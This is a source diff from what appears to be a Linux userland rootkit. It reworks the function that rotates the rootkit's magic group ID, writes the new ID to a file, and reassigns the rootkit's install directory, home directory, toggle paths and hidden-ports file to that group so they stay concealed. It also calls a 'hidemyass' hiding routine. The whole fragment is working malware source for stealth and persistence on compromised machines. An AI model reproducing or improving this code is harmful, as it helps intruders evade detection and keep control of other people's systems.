@@ -9,7 +9,7 @@ void hidedircontents(const char *path, gid_t newgid){
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
             continue;
 
-        char tmp[strlen(path) + strlen(dir->d_name) + 3];
+        char tmp[strlen(path)+strlen(dir->d_name)+3];
         snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
         chown_path(tmp, newgid);
     }
@@ -18,24 +18,20 @@ void hidedircontents(const char *path, gid_t newgid){
 }
 
 gid_t changerkgid(void){
-    hook(CFOPEN, CSETGID, CFWRITE, CCHMOD);
-    srand(time(NULL));
-
     FILE *fp;
-    gid_t oldgid, newgid;
-    int x = 3, i;
-    char buf[12];
+    gid_t newgid=0;
+    char buf[16];
 
-    oldgid = getgid();
-    newgid = rand() >> x;
-    while((long)call(CSETGID, newgid) < 0)
-        newgid = rand() >> x++;
-    call(CSETGID, oldgid);
+    hook(CFOPEN, CFWRITE, CCHMOD);
+
+    srand(time(NULL));
+    while(gidtaken(newgid))
+        newgid = (gid_t)(rand() % (MAX_GID - MIN_GID + 1)) + MIN_GID;
 
     fp = call(CFOPEN, GID_PATH, "w");
     if(fp == NULL)
         return MAGIC_GID;
-    snprintf(buf, sizeof(buf), "%d", newgid);
+    snprintf(buf, sizeof(buf), "%u", newgid);
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
 
@@ -47,14 +43,12 @@ gid_t changerkgid(void){
     hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
 
-    for(i = 0; i != TOGPATHS_SIZE; i++)
+    for(int i = 0; i != TOGPATHS_SIZE; i++)
         chown_path(togpaths[i], newgid);
 
 #ifdef HIDE_PORTS
     chown_path(HIDEPORTS, newgid);
 #endif
-
-    
 #ifdef HIDE_MY_ASS
     hidemyass();
 #endif
